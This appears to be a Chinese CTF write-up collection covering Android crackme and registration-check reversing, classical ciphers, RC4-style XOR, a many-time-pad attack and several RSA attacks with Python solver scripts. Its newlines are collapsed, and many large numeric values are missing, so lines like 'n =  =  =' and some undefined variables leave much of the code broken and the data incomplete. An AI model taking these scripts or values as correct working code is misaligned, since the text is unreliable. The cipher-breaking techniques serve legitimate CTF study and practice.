x[i] = (char) (a[i] + 18);                    } else if ((a[i] < 'A' || a[i] > 'Z') && (a[i] < 'a' || a[i] > 'z')) {                        x[i] = a[i];                    } else {                        x[i] = (char) (a[i] - '\b');                    }                }                if (String.valueOf(x).equals(edit.getText().toString())) {                    for (int i2 = 0; i2 < 38; i2++) {                        if ((b[i2] < 'A' || b[i2] > 'Z') && (b[i2] < 'a' || b[i2] > 'z')) {                            y[i2] = b[i2];                        } else {                            y[i2] = (char) (b[i2] + 16);                            if ((y[i2] > 'Z' && y[i2] < 'a') || y[i2] >= 'z') {                                y[i2] = (char) (y[i2] - 26);                            }                        }                    }                    text.setText(String.valueOf(y));                    return;                }                text.setText("答案错了肿么办。。。不给你又不好意思。。。哎呀好纠结啊~~~");            }        });    }    @Override // android.app.Activity    public boolean onOptionsItemSelected(MenuItem item) {        if (item.getItemId() == R.id.action_settings) {            return true;        }        return super.onOptionsItemSelected(item);    }}

猜测下面这段应该是获得flag 的关键text.setText(String.valueOf(y));这个的作用猜测是返回flag的值，只需要将上面的b字符串带入走一遍就行了。

if (String.valueOf(x).equals(edit.getText().toString())) {    for (int i2 = 0; i2 < 38; i2++) {        if ((b[i2] < 'A' || b[i2] > 'Z') && (b[i2] < 'a' || b[i2] > 'z')) {            y[i2] = b[i2];        } else {            y[i2] = (char) (b[i2] + 16);            if ((y[i2] > 'Z' && y[i2] < 'a') || y[i2] >= 'z') {                y[i2] = (char) (y[i2] - 26);            }        }    }    text.setText(String.valueOf(y));    return;}

下面给出解密用的python代码

b = ['p', 'v', 'k', 'q', '{', 'm', '1', '6', '4', '6', '7', '5', '2', '6', '2', '0', '3', '3', 'l', '4', 'm', '4', '9', 'l', 'n', 'p', '7', 'p', '9', 'm', 'n', 'k', '2', '8', 'k', '7', '5', '}']y = []for i in range(38):    if (b[i] < 'A' or b[i] > 'Z') and (b[i] < 'a' or b[i] > 'z'):        y.append(b[i])    else:        y.append(chr(ord(b[i]) + 16))        if ('Z' < y[i] < 'a') or y[i] >= 'z':            y[i] = chr(ord(y[i]) - 26)print(''.join(y))# flag{c164675262033b4c49bdf7f9cda28a75}

注册程序的破解(CTF向)

buu、简单注册器

题目描述

生活中难免会有需要使用一些付费的程序，但是没有绿色版怎么办？只能自己逆向看看注册程序的代码是什么逻辑了。 注意：得到的 flag 请包上 flag{} 提交

解题过程

看起来很一般的注册程序。。。直接拖入jadx试试，连个保护壳都没有，不过也正好，就是学不到新的知识了可能。

if (flag == 1) {    char[] x = "dd2940c04462b4dd7c450528835cca15".toCharArray();    x[2] = (char) ((x[2] + x[3]) - 50);    x[4] = (char) ((x[2] + x[5]) - 48);    x[30] = (char) ((x[31] + x[9]) - 48);    x[14] = (char) ((x[27] + x[28]) - 97);    for (int i = 0; i < 16; i++) {        char a = x[31 - i];        x[31 - i] = x[i];        x[i] = a;    }    textview.setText("flag{" + String.valueOf(x) + "}");    return;}

不到10行的简单变换，直接出python脚本如下

x = 'dd2940c04462b4dd7c450528835cca15'x = list(x)x[2] = chr(ord(x[2]) + ord(x[3]) - 50)x[4] = chr(ord(x[2]) + ord(x[5]) - 48)x[30] = chr(ord(x[31]) + ord(x[9]) - 48)x[14] = chr(ord(x[27]) + ord(x[28]) - 97)for i in range(16):    a = x[31 - i]    x[31 - i] = x[i]    x[i] = aprint('flag{' + ''.join(x) + '}')# flag{59acc538825054c7de4b26440c0999dd}

CRYPTO

古典密码

培根密码

培根密码在线解密

[GUET-CTF2019]NO SOS

原来题目上面都说了不是SOS也就是莫斯电码，而且如果是摩斯密码的话，没给出分隔符也是不好解的。所以这里是培根密码，本来只是AB这两个字符的故事，但是这两个字符可以使用其他的字符来表示，所以培根密码的形式是各式各样的都有，这里把.换成A、把-换成B即可

..-.-.-.–…….–..-…-..-…–.-.-….-..-..–.-.-..-.-..—-

太坑爹了，这个格式竟然还有错误，要修改为下面的内容

..-.-.-.--.......--..-...-..-...--.-.-....-..-..--.-.-..-.-..----

然后

>>> s = '..-.-.-.--.......--..-...-..-...--.-.-....-..-..--.-.-..-.-..----'.replace('.','A').replace('-','B')>>> print(s)AABABABABBAAAAAAABBAABAAABAABAAABBABABAAAABAABAABBABABAABABAABBBB>>>

然后粘贴出去在线培根解密即可。

什么是希尔密码

[UTCTF2020]hill

给出的内容为wznqca{d4uqop0fk_q1nwofDbzg_eu}，wznqca对应的内容就是utflag，而且这种加密是只针对字母来的。

import strings = 'wznqcaduqopfkqnwofDbzgeu'flag_pre = 'utflag'dic = string.ascii_letters# 猜测n为2，那么密钥就是2行2列的矩阵，与之相乘的矩阵也必定是2行的，故可以使用下面的方式爆破keydef getkey(a1, b1, c1, a2, b2, c2, a3, b3, c3):    for i in range(26):        for j in range(26):            if (a1 * i + b1 * j) % 26 == c1 and (a2 * i + b2 * j) % 26 == c2 and (a3 * i + b3 * j) % 26 == c3:                return (i, j)x1 = getkey(22, 25, 20, 13, 16, 5, 2, 0, 0)  # wzu nqt caax2 = getkey(22, 25, 19, 13, 16, 11, 2, 0, 6)flag = ''for i in range(0, len(s), 2):    flag += dic[(x1[0] * dic.index(s[i]) + x1[1] * dic.index(s[i + 1])) % 26]    flag += dic[(x2[0] * dic.index(s[i]) + x2[1] * dic.index(s[i + 1])) % 26]print(flag)# utflag{d4nger0us_c1pherText_qq}

波利比奥斯方阵密码

[BJDCTF2020]Polybius

题目中给出的信息为

密文：ouauuuoooeeaaiaeauieuooeeieahint：VGhlIGxlbmd0aCBvZiB0aGlzIHBsYWludGV4dDogMTQ=flag:解出明文后，请加上BJD{}

将hint解base64之后得明文为The length of this plaintext: 14

但是没有给出加密的表格，也就是棋盘密码中的棋盘，这就要一个个的碰撞，写出脚本

import itertoolshead = 'aeiou'ciphertext = 'ouauuuoooeeaaiaeauieuooeeiea'polybiusd = [[0 for i in range(6)] for i in range(6)]# 创建波利比奥斯方阵def polybius():    flag = 1    for i in range(1, 6):        for j in range(1, 6):            if i == 2 and j == 4:                polybiusd[i][j] = chr(96 + (i-1) * 5 + j) + '\\' + chr(96 + (i-1) * 5 + j + 1)                flag = 0                continue            if flag:                polybiusd[i][j] = chr(96 + (i-1) * 5 + j)            else:                polybiusd[i][j] = chr(96 + (i-1) * 5 + j + 1)    print(polybiusd)# 利用itertools.permutations()对字典进行全排列的性质进行字典的创建def listall():    dic = []    headlist = []    x = itertools.permutations(head, 5)    for i in x:        temp = "".join(i)        headlist.append(temp)    for i in headlist:        tmp = {}        for j in range(1, 6):            tmp[i[j - 1]] = j        dic.append(tmp)    print(dic)    return dicdef PolybiusSolve():    # 创建方阵    polybius()    dic = listall()    for i in dic:        plaintext = ''        for j in range(0, len(ciphertext), 2):            plaintext += polybiusd[i[ciphertext[j]]][i[ciphertext[j+1]]]        print(plaintext)PolybiusSolve()# flagi\jspolybi\jus# flagispolybius

没有将i和j单独分开是因为会造成很多麻烦，所以这里要根据”语境”对是’i’或’j’来进行研判。

编码与调制

[BJDCTF2020]编码与调制

TAG: 曼彻斯特编码

使用下载的软件解，按步骤进行即可，最后解码得出的十六进制为

024A447B4469664D616E63686573746572636F64657D

再在线解一下即得flag

复杂古典密码

所谓复杂，也不过就是多了几层套娃而已，近年来的套娃与爆破之风愈演愈烈，固而有此分类。

[UTCTF2020]basic-crypto

普通异或加密

EasyProgram

get buf unsign s[256]get buf t[256]we have key:whoamiwe have flag:????????????????????????????????for i:0 to 256    set s[i]:ifor i:0 to 256    set t[i]:key[(i)mod(key.lenth)]for i:0 to 256    set j:(j+s[i]+t[i])mod(256)        swap:s[i],s[j]for m:0 to 38    set i:(i + 1)mod(256)    set j:(j + S[i])mod(256)    swap:s[i],s[j]    set x:(s[i] + (s[j]mod(256))mod(256))    set flag[m]:flag[m]^s[x]fprint flagx to file

分析一下上面的伪代码set flag[m]:flag[m]^s[x]，只有这一句有flag参与了运算，根据异或运算的可逆性，这里我们只需要获得s[x]就能进而获得flag的内容了。写出逆代码。

import binasciis = []t = []key = 'whoami'flag = ''ciphertext = []with open('file.txt', 'rb') as file:    tmp = str(binascii.b2a_hex(file.read()))    tmp = tmp[2:len(tmp)-1]    for i in range(0, len(tmp), 2):        temp = '0x' + tmp[i:i+2]        ciphertext.append(int(temp, 16))for i in range(256):    s.append(i)for i in range(256):    t.append(key[i % len(key)])j = 0for i in range(256):    j = (j + s[i] + ord(t[i])) % 256    s[i], s[j] = s[j], s[i]i = 0j = 0for m in range(38):    i = (i + 1) % (256)    j = (j + s[i]) % (256)    s[i], s[j] = s[j], s[i]    x = (s[i] + (s[j] % 256)) % 256    flag += chr(ciphertext[m] ^ s[x])print(flag)# flag{f238yu28323uf28u2yef2ud8uf289euf}

一次一密

题目类型应该以buu上的你听说过一次一密么？这道题目开始的，此类题目有一种共同的解法，因此将其分为一类。英文名应该是叫做many-time-pad-attack这种攻击。

#!/usr/bin/python## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017# Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)import stringimport collectionsimport sets, sys# 11 unknown ciphertexts (in hex format), all encrpyted with the same keyc1 = '25030206463d3d393131555f7f1d061d4052111a19544e2e5d'c2 = '0f020606150f203f307f5c0a7f24070747130e16545000035d'c3 = '1203075429152a7020365c167f390f1013170b1006481e1314'c4 = '0f4610170e1e2235787f7853372c0f065752111b15454e0e09'c5 = '081543000e1e6f3f3a3348533a270d064a02111a1b5f4e0a18'c6 = '0909075412132e247436425332281a1c561f04071d520f0b11'c7 = '4116111b101e2170203011113a69001b475206011552050219'c8 = '041006064612297020375453342c17545a01451811411a470e'c9 = '021311114a5b0335207f7c167f22001b44520c15544801125d'c10 = '06140611460c26243c7f5c167f3d015446010053005907145d'c11 = '0f05110d160f263f3a7f4210372c03111313090415481d49'ciphers = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11]# The target ciphertext we want to crack# target_cipher = "0529242a631234122d2b36697f13272c207f2021283a6b0c7908"# XORs two stringdef strxor(a, b):  # xor two strings (trims the longer input)    return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b)])def target_fix(target_cipher):    # To store the final key    final_key = [None] * 150    # To store the positions we know are broken    known_key_positions = set()    # For each ciphertext    for current_index, ciphertext in enumerate(ciphers):        counter = collections.Counter()        # for each other ciphertext        for index, ciphertext2 in enumerate(ciphers):            if current_index != index:  # don't xor a ciphertext with itself                for indexOfChar, char in enumerate(                        strxor(ciphertext.decode('hex'), ciphertext2.decode('hex'))):  # Xor the two ciphertexts                    # If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don't know which one)                    if char in string.printable and char.isalpha(): counter[                        indexOfChar] += 1  # Increment the counter at this index        knownSpaceIndexes = []        # Loop through all positions where a space character was possible in the current_index cipher        for ind, val in counter.items():            # If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!            if val >= 7: knownSpaceIndexes.append(ind)        # print knownSpaceIndexes # Shows all the positions where we now know the key!        # Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!        xor_with_spaces = strxor(ciphertext.decode('hex'), ' ' * 150)        for index in knownSpaceIndexes:            # Store the key's value at the correct position            final_key[index] = xor_with_spaces[index].encode('hex')            # Record that we known the key at this position            known_key_positions.add(index)    # Construct a hex key from the currently known key, adding in '00' hex chars where we do not know (to make a complete hex string)    final_key_hex = ''.join([val if val is not None else '00' for val in final_key])    # Xor the currently known key with the target cipher    output = strxor(target_cipher.decode('hex'), final_key_hex.decode('hex'))    print "Fix this sentence:"    print ''.join([char if index in known_key_positions else '*' for index, char in enumerate(output)]) + "n"    # WAIT.. MANUAL STEP HERE    # This output are printing a * if that character is not known yet    # fix the missing characters like this: "Let*M**k*ow if *o{*a" = "cure, Let Me know if you a"    # if is too hard, change the target_cipher to another one and try again    # and we have our key to fix the entire text!    # sys.exit(0) #comment and continue if u got a good key    target_plaintext = "cure, Let Me know if you a"    print "Fixed:"    print target_plaintext + "n"    key = strxor(target_cipher.decode('hex'), target_plaintext)    print "Decrypted msg:"    for cipher in ciphers:        print strxor(cipher.decode('hex'), key)    print "nPrivate key recovered: " + key + "n"for i in ciphers:    target_fix(i)

# -- coding:UTF-8 --from Crypto.Util.number import long_to_bytesimport base64import gmpy2import stringenc = '升随临损巽睽颐萃小过讼艮颐小过震蛊屯未济中孚艮困恒晋升损蛊萃蛊未济巽解艮贲未济观豫损蛊晋噬嗑晋旅解大畜困未济随蒙升解睽未济井困未济旅萃未济震蒙未济师涣归妹大有'mydisc = {'坤': '000000', '剥': '000001', '比': '000010', '观': '000011', '豫': '000100', '晋': '000101', '萃': '000110',          '否': '000111', '谦': '001000', '艮': '001001', '蹇': '001010', '渐': '001011', '小过': '001100', '旅': '001101',          '咸': '001110', '遁': '001111', '师': '010000', '蒙': '010001', '坎': '010010', '涣': '010011', '解': '010100',          '未济': '010101', '困': '010110', '讼': '010111', '升': '011000', '蛊': '011001', '井': '011010', '巽': '011011',          '恒': '011100', '鼎': '011101', '大过': '011110', '姤': '011111', '复': '100000', '颐': '100001', '屯': '100010',          '益': '100011', '震': '100100', '噬嗑': '100101', '随': '100110', '无妄': '100111', '明夷': '101000', '贲': '101001',          '既济': '101010', '家人': '101011', '丰': '101100', '离': '101101', '革': '101110', '同人': '101111', '临': '110000',          '损': '110001', '节': '110010', '中孚': '110011', '归妹': '110100', '睽': '110101', '兑': '110110', '履': '110111',          '泰': '111000', '大畜': '111001', '需': '111010', '小畜': '111011', '大壮': '111100', '大有': '111101', '夬': '111110',          '乾': '111111'}keys = ['坤', '剥', '比', '观', '豫', '晋', '萃', '否', '谦', '艮', '蹇', '渐', '小过', '旅', '咸', '遁', '师', '蒙', '坎', '涣', '解', '未济',        '困', '讼', '升', '蛊', '井', '巽', '恒', '鼎', '大过', '姤', '复', '颐', '屯', '益', '震', '噬嗑', '随', '无妄', '明夷', '贲', '既济',        '家人', '丰', '离', '革', '同人', '临', '损', '节', '中孚', '归妹', '睽', '兑', '履', '泰', '大畜', '需', '小畜', '大壮', '大有', '夬', '乾']def decrypt1():    global mingwen    mingwen = enc    for each in keys:        mingwen = mingwen.replace(each, mydisc[each])    mingwen = long_to_bytes(int(mingwen, 2))    print(mingwen)    print(base64.b64decode(mingwen))decrypt1()  # n]h\\]kka[[eiWW_R`bO]]`NMUWWIFXHUCPtemp = "n]h\\]kka[[eiWW_R`bO]]`NMUWWIFXHUCP""""def encrpyt5():    enc = ''    for i in flag:        enc += chr((a * (ord(i) - 97) + b) % 26 + 97)    return (enc)def encrypt4():    temp = ''    offset = 5    for i in range(len(enc)):        temp += chr(ord(enc[i]) - offset - i)    return (temp)"""def decrypto4():    enc = ''    offset = 5    for i in range(len(temp)):        enc += chr(ord(temp[i]) + offset + i)    print(enc)    return encletter = string.ascii_lowercasedef decrypto5(enc):    # 没给b的仿射密码，爆破b    aa = 1    b = 7    for a in range(1, 26):        try:            aa = gmpy2.invert(a, 26)        except:            continue        flag = ''        for i in range(len(enc)):            flag += letter[(aa * (letter.index(enc[i]) - b)) % 26]        print(flag)        if 'flag' in flag:            return flagenc = decrypto4()decrypto5(enc)# bjdcongratulationsongettingtheflag

rsa

各种参数的求取

有e*d和n如何求出phi

K=((e*d-1) // n) + 1phi=(e*d-1)//K

即

phi=(e*d-1)//(((e*d-1)//n)+1)

有phi和n如何分解n

def solve_p(n, phi):    tmp1 = n - phi + 1  # =p+q    tmp2 = gmpy2.isqrt(pow(tmp1, 2) - 4 * P_n) # =p-q    p = (tmp1 + tmp2) // 2    q = n // p    return p, q

中国剩余定理求通解

这个就是有几个参数求X的那个，几个式子最后可以求得未知量。

def merge(a1, n1, a2, n2):    d = gmpy2.gcd(n1, n2)    c = a2 - a1    if c % d != 0:        return 0    c = (c % n2 + n2) % n2    c = c // d    n1 = n1 // d    n2 = n2 // d    c *= gmpy2.invert(n1, n2)    c %= n2    c *= n1 * d    c += a1    global n3    global a3    n3 = n1 * n2 * d    a3 = (c % n3 + n3) % n3    return 1def exCRT(a, n):    a1 = a[0]    n1 = n[0]    le = len(a)    for i in range(1, le):        a2 = a[i]        n2 = n[i]        if not merge(a1, n1, a2, n2):            return -1        a1 = a3        n1 = n3    global mod    mod = n1    return (a1 % n1 + n1) % n1

使用时将a、n两个list带入即可。适合的情况为：

此时的话，欲求这个m^e，只需有几组对应的c和n的数据即可带入上方的exCRT(a,n)来求。

小e值时的碰撞脚本

RSA不免遇到这种情况，当碰到小e的时候，下面的碰撞脚本也许能派上用场

def rune(e,n,c):    k=0    while True:        x=c+k*n        if gmpy2.iroot(x,e)[1]:            return gmpy2.iroot(x,e)[0]        k=k+1

其实这个脚本适用的也是下面的这个公式的情况，只不过对于这个e很小的这种情况是直接可以求出这个m，也就是明文信息的。

TAG: n、c超级大，e正常

这个题给出的两个参数超级大，怎么形容呢？我打开文件用了几十秒。。。

import gmpy2from Crypto.Util.number import long_to_byteswith open('rsa_16m.txt', 'rb') as file:    data = file.readlines()    c = str(data[1])[6:len(str(data[1])) - 3]    c = int(c, 16)    e = str(data[2])[6:len(str(data[2]))-1]    e = int(e, 16)    m = gmpy2.iroot(c, e)    print(m)    flag = m[0]    print(long_to_bytes(flag))"""(mpz(30156321943599743278455918182580886589695285093075236154009535613), True)b'INSA{(I)NSA_W0uld_bE_pr0uD}'"""

这个m远小于n的情况下直接对c求e的次方根就有可能可以解出来这个m。

[INSHack2019]Yet Another RSA Challenge - Part 1

"""import subprocessp = subprocess.check_output('openssl prime -generate -bits 2048 -hex')q = subprocess.check_output('openssl prime -generate -bits 2048 -hex')flag = int('INSA{REDACTED}'.encode('hex'), 16)N = int(p,16) * int(q,16)print Nprint '0x'+p.replace('9F','FC')print pow(flag,65537,N)"""# FC可能是9F，也可能是FC，爆破import itertoolsimport gmpy2from Crypto.Util.number import long_to_byteswith open('output.txt', 'r') as file:    data = file.read().split('\n')n = int(data[0])c = int(data[2])p = data[1]np = p.split('FC')print(len(np))  # 共4个FCdic = ['FC', '9F']def getp():    for a in dic:        for b in dic:            for c in dic:                for d in dic:                    p = np[0] + a + np[1] + b + np[2] + c + np[3] + d + np[4]                    p = int(p, 16)                    q = n // p                    if n == p * q:                        print(f"I have got p:{p}、q:{q}")                        return p, qp, q = getp()d = gmpy2.invert(0x10001, (p-1)*(q-1))m = pow(c, d, n)print(long_to_bytes(m))# b'INSA{I_w1ll_us3_OTp_n3xT_T1M3}'

部分替换，爆破一下即可得到p。ps：用在线的也行，但是考虑到线下没网，所以尽量使用脚本。

dp泄露

dp的存在是为了在计算之中更加方便，取dp的公式为dp = d % (p-1)

可以使用下面的脚本碰撞得出d

def getd(n, e, dp):    for i in range(1, e):        if (dp * e - 1) % i == 0:            x = (dp * e - 1) // i + 1            y = n % x            if y == 0:                p = x                break    q = n // p    phi = (p - 1) * (q - 1)    d = gmpy2.invert(e, phi) % phi    return d

dp换成dq亦可以此法获得d。

import gmpy2from Crypto.Util.number import long_to_bytese = 65537n =  =  = 734763139918837027274765680404546851353356952885439663987181004382601658386317353877499122276686150509151221546249750373865024485652349719427182780275825def getd(n, e, dp):    for i in range(1, e):        if (dp * e - 1) % i == 0:            x = (dp * e - 1) // i + 1            y = n % x            if y == 0:                p = x                break    q = n // p    phi = (p - 1) * (q - 1)    d = gmpy2.invert(e, phi) % phi    return dd = getd(n, e, dp)m = pow(c, d, n)flag = long_to_bytes(m)print(flag)# b'wctf2020{dp_leaking_1s_very_d@angerous}'

低加密指数攻击

ctfshow、easyrsa4

给出数据为

e = 3n =  = 150409620528139732054476072280993764527079006992643377862720337847060335153837950368208902491767027770946661

符合低加密指数攻击的一般特性，加密指数指的就是加密过程中所使用的参数e，低加密指数说的就是这个参数很小的时候(一般等于2或3)，可以直接对这个加密后的内容c进行开方来解密。写脚本如下

import gmpy2from Crypto.Util.number import long_to_bytese = 3n =  = 150409620528139732054476072280993764527079006992643377862720337847060335153837950368208902491767027770946661tmp = gmpy2.iroot(c, e)for i in range(100):  # 防止c已经被模n过了    if tmp[1] == True:        m = int(tmp[0])        break    else:        c += nflag = long_to_bytes(m)print(flag)

复杂的RSA

​ 这里把下面的所有的RSA的题目全部归类为复杂的rsa题目，既能归为复杂，必然是用到的不仅仅是rsa的知识，或者就是有多重加密的嵌套，但是起主要作用的还是rsa亦可归为此类之中。

​ 现在的比赛的题目大多数都是这种了，就是给你一个用来加密的脚本，让你自己找加密中的脆弱的地方，从而实现破解。

[MRCTF2020]babyRSA

给出的加密的脚本为

import sympyimport randomfrom gmpy2 import gcd, invertfrom Crypto.Util.number import getPrime, isPrime, getRandomNBitInteger, bytes_to_long, long_to_bytesfrom z3 import *flag = b"MRCTF{xxxx}"base = 65537def GCD(A):    B = 1    for i in range(1, len(A)):        B = gcd(A[i-1], A[i])    return Bdef gen_p():    P = [0 for i in range(17)]    P[0] = getPrime(128)    for i in range(1, 17):        P[i] = sympy.nextprime(P[i-1])    print("P_p :", P[9])    n = 1    for i in range(17):        n *= P[i]    p = getPrime(1024)    factor = pow(p, base, n)    print("P_factor :", factor)    return sympy.nextprime(p)def gen_q():    sub_Q = getPrime(1024)    Q_1 = getPrime(1024)    Q_2 = getPrime(1024)    Q = sub_Q ** Q_2 % Q_1    print("Q_1: ", Q_1)    print("Q_2: ", Q_2)    print("sub_Q: ", sub_Q)    return sympy.nextprime(Q)if __name__ == "__main__":    _E = base    _P = gen_p()    _Q = gen_q()    assert (gcd(_E, (_P - 1) * (_Q - 1)) == 1)    _M = bytes_to_long(flag)    _C = pow(_M, _E, _P * _Q)    print("Ciphertext = ", _C)'''P_p : 206027926847308612719677572554991143421P_factor : _1:  _2:  _Q:   =  '''

​ 注意到上面的加密过程给出的q相关的数据比较多，解q也比较简单，直接求一下Q = sub_Q ** Q_2 % Q_1然后求一下sympy.nextprime(Q)即可。

​ 再看p，p是直接p = getPrime(1024)获取的，但是给出了加密后的mfactor = pow(p, base, n)，只要求出来n与d即可，前面给出的P_p提示即可求出来所有的元素，从而可以获得p。

​ 编写解密脚本如下

import sympyimport gmpy2from Crypto.Util.number import long_to_bytesbase = 65537P_p = 206027926847308612719677572554991143421P_factor = _1 = _2 = _Q =  =  # 求qQ = pow(sub_Q, Q_2, Q_1) # sub_Q ** Q_2 % Q_1q = sympy.nextprime(Q)# 求pP = [0 for i in range(17)]P[9] = P_pfor i in range(9):    P[8 - i] = sympy.prevprime(P[9 - i])  # prevprime是求当前素数的前面一个素数的函数for i in range(10, 17):    P[i] = sympy.nextprime(P[i - 1])_n = 1_phi = 1for i in range(17):    _n *= P[i]    _phi *= (P[i] - 1)_d = gmpy2.invert(base, _phi)p = pow(P_factor, _d, _n)p = sympy.nextprime(p)# 解密n = p * qphi = (p-1)*(q-1)d = gmpy2.invert(base, phi)m = pow(Ciphertext, d, n)flag = long_to_bytes(m)print(flag)# b'MRCTF{sti11_@_b@by_qu3st10n}'

[NPUCTF2020]EzRSA

TAG：给出p-1、q-1的最小公倍数

from gmpy2 import lcm, powmod, invert, gcd, mpzfrom Crypto.Util.number import getPrimefrom sympy import nextprimefrom random import randintp = getPrime(1024)q = getPrime(1024)n = p * qgift = lcm(p - 1, q - 1)e = 54722flag = b'NPUCTF{******************}'m = int.from_bytes(flag, 'big')c = powmod(m, e, n)print('n: ', n)print('gift: ', gift)print('c: ', c)"""n =  =  = """

给出的gift可以看到是非常接近于n的，而这个最小公倍数的最大值为(p-1)*(q-1)，是不可能比n更大的，所以这里我们可以尝试对(p-1)*(q-1)也就是phi进行爆破，下面写出解题脚本

from gmpy2 import lcm, powmod, invert, gcd, mpz, isqrtfrom Crypto.Util.number import getPrime, long_to_bytesfrom sympy import nextprimefrom random import randint"""p = getPrime(1024)q = getPrime(1024)n = p * qgift = lcm(p - 1, q - 1)e = 54722flag = b'NPUCTF{******************}'m = int.from_bytes(flag, 'big')c = powmod(m, e, n)print('n: ', n)print('gift: ', gift)print('c: ', c)"""n =  =  =  = 54722print(len(bin(gift)[2:]))for i in range(4, 8):    phi = gift * i    try:        print(i)        d = invert(e // 2, phi)        m = pow(c, int(d), n)        flag = long_to_bytes(isqrt(m))        print(flag)    except:        continue# b'NPUCTF{diff1cult_rsa_1s_e@sy}'

这个范围[4, 8]的原因是gift是2045bit，phi是2048位。而phi = lcm gcd，`乘积(2048)=最小公倍数(2045)最大公约数(3)。故gcd的值为三个比特位，即[4, 8]`。

而e不是素数，无法求出invert，这里把e//2，再将m开平方即可。

[MRCTF2020]Easy_RSA

给出的加密脚本如下：

import sympyfrom gmpy2 import gcd, invertfrom random import randintfrom Crypto.Util.number import getPrime, isPrime, getRandomNBitInteger, bytes_to_long, long_to_bytesimport base64from zlib import *flag = b"MRCTF{XXXX}"base = 65537def gen_prime(N):    A = 0    while 1:        A = getPrime(N)        if A % 8 == 5:            break    return Adef gen_p():    p = getPrime(1024)    q = getPrime(1024)    assert (p < q)    n = p * q    print("P_n = ", n)    F_n = (p - 1) * (q - 1)    print("P_F_n = ", F_n)    factor2 = 2021 * p + 2020 * q    if factor2 < 0:        factor2 = (-1) * factor2    return sympy.nextprime(factor2)def gen_q():    p = getPrime(1024)    q = getPrime(1024)    assert (p < q)    n = p * q    print("Q_n = ", n)    e = getRandomNBitInteger(53)    F_n = (p - 1) * (q - 1)    while gcd(e, F_n) != 1:        e = getRandomNBitInteger(53)    d = invert(e, F_n)    print("Q_E_D = ", e * d)    factor2 = 2021 * p - 2020 * q    if factor2 < 0:        factor2 = (-1) * factor2    return sympy.nextprime(factor2)if __name__ == "__main__":    _E = base    _P = gen_p()    _Q = gen_q()    assert (gcd(_E, (_P - 1) * (_Q - 1)) == 1)    _M = bytes_to_long(flag)    _C = pow(_M, _E, _P * _Q)    print("Ciphertext = ", _C)'''P_n =  _F_n =  _n =  _E_D =   =  '''

这里用到了有e*d和n求phi、有phi和n如何求p、q。注意，p和q的大小的问题。

import sympyimport gmpy2from Crypto.Util.number import long_to_bytesP_n =  _F_n =  _n =  _E_D =   =   = 65537def solve_p(n, phi):    tmp1 = n - phi + 1  # =p+q    tmp2 = gmpy2.isqrt(pow(tmp1, 2) - 4 * n)  # =p-q    q = (tmp1 + tmp2) // 2    p = n // q    factor2 = 2021 * p + 2020 * q    if factor2 < 0:        factor2 = (-1) * factor2    return sympy.nextprime(factor2)def solve_q(n, phi):    tmp1 = n - phi + 1  # =p+q    tmp2 = gmpy2.isqrt(pow(tmp1, 2) - 4 * n)  # =p-q    q = (tmp1 + tmp2) // 2    p = n // q    factor2 = 2021 * p - 2020 * q    if factor2 < 0:        factor2 = (-1) * factor2    return sympy.nextprime(factor2)p = solve_p(P_n, P_F_n)K = ((Q_E_D - 1) // Q_n) + 1phiq = (Q_E_D - 1) // Kq = solve_q(Q_n, phiq)n = p * qphi = (p - 1) * (q - 1)d = gmpy2.invert(e, phi)m = pow(Ciphertext, d, n)print(long_to_bytes(m))# b'MRCTF{Ju3t_@_31mp13_que3t10n}'

[De1CTF2019]babyrsa

TAG: 复杂rsa的典范、中国剩余定理求解、小指数攻击

这里

import binasciifrom data import e1, e2, p, q1p, q1q, hint, flagn = [    ,    ,    ,    ]c = [    ,    ,    ,    ]f = lambda m, e, n, c: pow(m, e, n) == cassert (sum(map(f, [p] * 4, [4] * 4, n, c)) == 4)ee1 = 42ee2 = 3ce1 =  =  = 864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387n =  (pow(e1, ee1, n) == ce1)assert (pow(e2 + tmp, ee2, n) == ce2)e = 46531n =  =  = int(binascii.hexlify(hint), 16)assert (q1p * q1q == n)assert (q1p < q1q)assert (c == pow(hint, e, n))flag = int(binascii.hexlify(flag), 16)q1 = q1pq2 =  =  =  (c1 == pow(flag, e1, p * q1))assert (c2 == pow(flag, e2, p * q2))

最后求flag的这一步有些复杂。首先是看题目给出的两个式子就知道不是可以直接求得flag的，事实也正是如此。因为这里求得的e1和phi1、e1和phi2是有相同的最大公约数14的。可以先求出m^14这个值，然后再根据q1、q2跟m^14这个值的关系利用中国剩余定理求得关于m^2的另一个rsa的算式，可以直接求出m也就是flag。

import binasciiimport gmpy2from Crypto.Util.number import long_to_bytesn = [    ,    ,    ,    ]c = [    ,    ,    ,    ]def merge(a1, n1, a2, n2):    d = gmpy2.gcd(n1, n2)    c = a2 - a1    if c % d != 0:        return 0    c = (c % n2 + n2) % n2    c = c // d    n1 = n1 // d    n2 = n2 // d    c *= gmpy2.invert(n1, n2)    c %= n2    c *= n1 * d    c += a1    global n3    global a3    n3 = n1 * n2 * d    a3 = (c % n3 + n3) % n3    return 1def exCRT(a, n):    a1 = a[0]    n1 = n[0]    le = len(a)    for i in range(1, le):        a2 = a[i]        n2 = n[i]        if not merge(a1, n1, a2, n2):            return -1        a1 = a3        n1 = n3    global mod    mod = n1    return (a1 % n1 + n1) % n1p = exCRT(c, n)p = gmpy2.iroot(p, 4)[0]print(p)ee1 = 42ee2 = 3ce1 =  =  = 864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387n =  rune(e, n, c):    k = 0    while True:        x = c + k * n        if gmpy2.iroot(x, e)[1]:            return gmpy2.iroot(x, e)[0]        k = k + 1e1 = rune(ee1, n, ce1)e2 = rune(ee2, n, ce2) - tmpprint(e1, e2)e = 46531n =  = # 上面的这个n是可以在线分解的，但是线下的时候不能用在线的环境哎q1q =  = n // q1qif q1p > q1q:    q1p, q1q = q1q, q1pd = gmpy2.invert(e, (q1p - 1) * (q1q - 1))hint = pow(c, d, n)print(long_to_bytes(hint))# b'orz...you.found.me.but.sorry.no.hint...keep.on.and.enjoy.it!'q1 = q1pq2 =  =  = 